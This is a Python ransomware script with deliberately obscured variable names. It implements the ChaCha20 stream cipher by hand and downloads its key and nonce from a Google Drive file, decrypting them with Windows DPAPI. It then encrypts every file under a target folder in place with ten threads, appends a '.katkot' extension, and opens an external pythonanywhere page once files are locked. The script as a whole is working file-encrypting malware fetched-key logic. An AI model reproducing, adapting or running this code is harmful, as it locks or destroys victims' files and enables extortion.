import struct
import os
from pathlib import Path
import stat
import shutil
import sys
import win32crypt
import requests
import ast
import webbrowser
from concurrent.futures import ThreadPoolExecutor
import mmap


def rotl32(v, n):
    return ((v << n) & 0xFFFFFFFF) | (v >> (32 - n))


def popcorn(a, b, c, d):
    a = (a + b) & 0xFFFFFFFF
    d ^= a
    d = rotl32(d, 16)
    c = (c + d) & 0xFFFFFFFF
    b ^= c
    b = rotl32(b, 12)
    a = (a + b) & 0xFFFFFFFF
    d ^= a
    d = rotl32(d, 8)
    c = (c + d) & 0xFFFFFFFF
    b ^= c
    b = rotl32(b, 7)
    return a, b, c, d



def corncan(flawzi, katkot, mimi):
    constants = [0x61707865, 0x3320646e, 0x79622d32, 0x6b206574]
    mariam_so8yra = [
        constants[0], constants[1], constants[2], constants[3],
        *struct.unpack('<8L', flawzi),
        katkot,
        *struct.unpack('<3L', mimi)
    ]
    toz_fi_mariam = mariam_so8yra.copy()

    for _ in range(10):
        toz_fi_mariam[0], toz_fi_mariam[4], toz_fi_mariam[8], toz_fi_mariam[12] = popcorn(*[toz_fi_mariam[i] for i in [0,4,8,12]])
        toz_fi_mariam[1], toz_fi_mariam[5], toz_fi_mariam[9], toz_fi_mariam[13] = popcorn(*[toz_fi_mariam[i] for i in [1,5,9,13]])
        toz_fi_mariam[2], toz_fi_mariam[6], toz_fi_mariam[10], toz_fi_mariam[14] = popcorn(*[toz_fi_mariam[i] for i in [2,6,10,14]])
        toz_fi_mariam[3], toz_fi_mariam[7], toz_fi_mariam[11], toz_fi_mariam[15] = popcorn(*[toz_fi_mariam[i] for i in [3,7,11,15]])

        toz_fi_mariam[0], toz_fi_mariam[5], toz_fi_mariam[10], toz_fi_mariam[15] = popcorn(*[toz_fi_mariam[i] for i in [0,5,10,15]])
        toz_fi_mariam[1], toz_fi_mariam[6], toz_fi_mariam[11], toz_fi_mariam[12] = popcorn(*[toz_fi_mariam[i] for i in [1,6,11,12]])
        toz_fi_mariam[2], toz_fi_mariam[7], toz_fi_mariam[8], toz_fi_mariam[13] = popcorn(*[toz_fi_mariam[i] for i in [2,7,8,13]])
        toz_fi_mariam[3], toz_fi_mariam[4], toz_fi_mariam[9], toz_fi_mariam[14] = popcorn(*[toz_fi_mariam[i] for i in [3,4,9,14]])

    for i in range(16):
        toz_fi_mariam[i] = (toz_fi_mariam[i] + mariam_so8yra[i]) & 0xFFFFFFFF

    return struct.pack('<16L', *toz_fi_mariam)



def sweetcorn(flawzi, mimi, corns):
    corn = bytearray()
    katkot = 0

    for i in range(0, len(corns), 64):
        block = corncan(flawzi, katkot, mimi)
        katkot += 1
        chunk = corns[i:i+64]
        wakwak = bytes(a ^ b for a, b in zip(chunk, block[:len(chunk)]))
        corn.extend(wakwak)

    return bytes(corn)



def lawlaw(func, path, _):
    os.chmod(path, stat.S_IWRITE)
    func(path)


def batot(ma7l_el_e2kama, flawzi, mimi):
    try:
        with open(ma7l_el_e2kama, 'rb') as f:
            corns = f.read()

        baby_wakwak = sweetcorn(flawzi, mimi, corns)

        with open(ma7l_el_e2kama, 'wb') as f:
            f.write(baby_wakwak)

        return True
    except Exception as e:
        print(f"ma7l_el_e2kama: {ma7l_el_e2kama}: {str(e)}")
        return False


def efta7_ya_semsem():
    msh_ha2olk = 'https://basma12.pythonanywhere.com/'
    webbrowser.open(msh_ha2olk)


def katkot_so8nan_moot(ma7l_el_e2kama, flawzi, mimi):
    if batot(ma7l_el_e2kama, flawzi, mimi):
        ma7l_el_e2kama_gdeed = ma7l_el_e2kama.with_suffix(ma7l_el_e2kama.suffix + '.katkot')
        ma7l_el_e2kama.rename(ma7l_el_e2kama_gdeed)
        return True
    return False


def katkot_fi_makani(mkan_el_welada, flawzi, mimi):
    mkan_el_welada = Path(mkan_el_welada).resolve()
    if not mkan_el_welada.exists():
        print(f"'{mkan_el_welada}' msh mawgod")
        return False

    btabet = 0
    msh_btabet = 0

    print(f"\nbatbot is here: {mkan_el_welada}...")

    try:
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = []
            for root, dirs, files in os.walk(mkan_el_welada):
                dirs[:] = [d for d in dirs if not d.startswith('.')]
                for file in files:
                    ma7l_el_e2kama = Path(root) / file

                    if ma7l_el_e2kama.suffix == '.batot':
                        continue

                    futures.append(executor.submit(katkot_so8nan_moot, ma7l_el_e2kama, flawzi, mimi))

            for future in futures:
                if future.result():
                    btabet += 1
                else:
                    msh_btabet += 1

        print(f"hi, btabet: {btabet}")
        print(f"hello, msh btabet: {msh_btabet}")

        if btabet > 0:
            efta7_ya_semsem()

        return btabet > 0

    except Exception as e:
        print(f"\nbatot mtl3sh batot: {str(e)}")
        return False


def ana_ba3raf_a2ra(sha2ti):
    download_msh_ha2olk = f"https://drive.google.com/uc?export=download&id={sha2ti}"
    response = requests.get(download_msh_ha2olk)
    if response.status_code == 200:
        return response.text
    else:
        return f"Failed to download: Status code {response.status_code}"


def la2et_flawzis(mo7twa_fady):
    gedo_ali = {}

    lines = mo7twa_fady.split('\n')
    for line in lines:
        if line.startswith('Instagram:'):
            flawzi_so8nan = line.split('Instagram:', 1)[1].strip()
            gedo_ali['instagram'] = flawzi_so8nan

        if line.startswith('Package:'):
            flawzi_so8nan = line.split('Package:', 1)[1].strip()
            gedo_ali['package'] = flawzi_so8nan

    return gedo_ali


sha2ti = "1V9GTEpa1y7hVxV2OvD8KzbFESdcj81GF"
ana_ba2ra = ana_ba3raf_a2ra(sha2ti)
flawzis = la2et_flawzis(ana_ba2ra)

def uncle_dahab_flawzi(batota: bytes):
    return win32crypt.CryptUnprotectData(batota, None, None, None, 0)[1]


if __name__ == "__main__":
    flawzi_hex = flawzis.get("instagram")
    mimi_hex = flawzis.get("package")

    instagram_bytes = ast.literal_eval(flawzi_hex)
    package_bytes = ast.literal_eval(mimi_hex)

    flawzi_bel_ma3kos = uncle_dahab_flawzi(instagram_bytes)
    mimi_bel_ma3kos = uncle_dahab_flawzi(package_bytes)

    if flawzi_hex and mimi_hex:
        try:
            flawzi = flawzi_bel_ma3kos
            mimi = mimi_bel_ma3kos

            if getattr(sys, 'frozen', False):
                sreri = os.path.dirname(sys.executable)
            else:
                sreri = os.path.dirname(os.path.abspath(__file__))

            dolabi = os.path.join(sreri, "test folder")

            if katkot_fi_makani(dolabi, flawzi, mimi):
                print("\ batot shatoor ")
            else:
                print("\nbatot FASHEL")

        except ValueError:
            print("flawzi or mimi msh fi a7san 7al.")
    else:
        print("flawzi and mimi msh mawgodeen, please rag3hom. ")